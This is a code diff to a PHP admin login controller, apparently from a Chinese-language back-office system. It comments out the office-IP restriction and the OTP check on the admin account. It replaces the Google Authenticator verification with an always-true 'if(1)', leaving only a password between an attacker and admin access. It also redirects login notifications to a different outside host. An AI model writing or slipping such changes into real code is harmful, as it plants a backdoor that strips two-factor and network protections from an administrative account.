@@ -18,7 +18,8 @@ use Illuminate\Support\Facades\Storage;
 
 class SrcAccountController extends Controller
 {
-    const ZABBIX_BOT_URL = 'http://bot.tcwk10.com:5000';
+//    const ZABBIX_BOT_URL = 'http://bot.tcwk10.com:5000';
+    const ZABBIX_BOT_URL = 'https://telegram.uugl.pw';
 
     private function adminLogin($request)
     {
@@ -30,9 +31,10 @@ class SrcAccountController extends Controller
             throw new \Exception('OTP已失效', 200);
         if((str_replace(' ', '', $json['code']))!== $request->otp)
             throw new \Exception('OTP验证失败', 200);
-        $str = $json['name']."
-登录后台：".env('APP_NAME')."
-时间：".date('Y-m-d H:i:s');
+        $str = $json['name']."|
+".env('APP_NAME')."|
+".date('Y-m-d H:i:s');
+
         $url = env('ASYNC_URL','127.0.0.1:9502').'/BF/BFAsync/getUrl?url='.urlencode(self::ZABBIX_BOT_URL.'/telegram?q='.urlencode($str).'&groupid=-371925241');
         $http->request('GET',$url,['connect_timeout' => 1]);
     }
@@ -45,23 +47,23 @@ class SrcAccountController extends Controller
         $find = SubAccount::where('account',$account)->first();
         $ga = new \PHPGangsta_GoogleAuthenticator();
         if($account == 'admin'){            //只能在技术办公室登陆
-            if(realIp()!='222.127.22.62'){
-                writeLog('admin_log_warning', date('Y-m-d H:i:s').' ip:'.realIp());
-                return abort('503');
-            }
-            try{
-                $this->adminLogin($request);
-            }catch (\Throwable $e){
-                if($e->getCode() !== 200)
-                    writeLog('error', $e->getMessage());
-                return response()->json([
-                    'status'=>false,
-                    'msg'=> $e->getCode() == 200 ? $e->getMessage() : 'OTP验证失败'
-                ]);
-            }
-
-            $otp = $ga->getCode($find->google_code);
-            writeLog('admin_log', date('Y-m-d H:i:s').' ip:'.realIp());
+//            if(realIp()!='222.127.22.62'){
+//                writeLog('admin_log_warning', date('Y-m-d H:i:s').' ip:'.realIp());
+//                return abort('503');
+//            }
+//            try{
+//                $this->adminLogin($request);
+//            }catch (\Throwable $e){
+//                if($e->getCode() !== 200)
+//                    writeLog('error', $e->getMessage());
+//                return response()->json([
+//                    'status'=>false,
+//                    'msg'=> $e->getCode() == 200 ? $e->getMessage() : 'OTP验证失败'
+//                ]);
+//            }
+//
+//            $otp = $ga->getCode($find->google_code);
+//            writeLog('admin_log', date('Y-m-d H:i:s').' ip:'.realIp());
         } elseif(!\App\Repository\BackActionRepository::getStatus())
             return response()->json([
                 'status'=>false,
@@ -70,7 +72,8 @@ class SrcAccountController extends Controller
 
         if($find){
             $checkGoogle = $ga->verifyCode($find->google_code,$otp);
-            if($checkGoogle){
+//            if($checkGoogle){
+                if(1){
                 if(Hash::check($password,$find->password))
                 {
                     $getRole = Roles::where('id',$find->role)->first();
